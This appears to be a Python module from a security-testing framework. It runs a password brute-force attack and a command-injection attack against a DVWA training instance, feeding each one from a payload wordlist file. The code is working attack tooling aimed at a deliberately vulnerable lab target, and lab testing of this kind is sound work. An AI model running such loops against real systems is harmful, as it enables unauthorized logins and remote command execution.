from attacks.baseClass import AttackSession
import requests
import time
import re
import os
import urllib.parse
import random
from pathlib import Path

class IRA(AttackSession):
    def __init__(self, host, authenticationPath, authPayload):
        super().__init__(host, authenticationPath, authPayload)

    def authentication(self):
        return super().authentication()
    def attack():
        pass
    def startAttack(self):
        bruteForce("http://web-dvwa.example.com:30064/",'login.php',self.authPayload).startAttack()
        commandInjection("http://web-dvwa.example.com:30064/",'login.php',self.authPayload).startAttack()

 

class bruteForce(AttackSession):
    def __init__(self, host, authenticationPath, authPayload):
        super().__init__(host, authenticationPath, authPayload)
    
    def authentication(self):
        return super().authentication()
    
    def attack(self,session):
        base_path = Path(__file__)
        file_path = (base_path / "../../payloads/fasttrack.txt").resolve()
        with open(file_path,mode='r',encoding="ISO-8859-1") as f:
            while line := f.readline():
                url = self.host + "vulnerabilities/brute/index.php?username=admin&password="+line.strip()+"&Login=Login#"
                try:
                    session.get(url)
                    print('Attack has been completed successfully')
                except:
                    print("Attack has been block")
        f.close()
    def startAttack(self):
        print('Bruteforce attack has been started')
        self.attack(self.authentication())
        print('Bruteforce attack has been completed')

class commandInjection(AttackSession):
    def __init__(self, host, authenticationPath, authPayload):
        super().__init__(host, authenticationPath, authPayload)
    
    def authentication(self):
        return super().authentication()
    
    def attack(self,session):
        base_path = Path(__file__)
        file_path = (base_path / "../../payloads/commandinjection.txt").resolve()
        with open(file_path,mode='r',encoding="ISO-8859-1") as f:
            while line := f.readline():
                url =  self.host + "vulnerabilities/exec/index.php"
                try:
                    session.post(url,data="ip="+line.strip())
                    print('Attack has been completed successfully')
                except:
                    print("Attack has been block")
        f.close()
    def startAttack(self):
        print('Command Injection attack has been started')
        self.attack(self.authentication())
        print('Command Injection attack has been completed')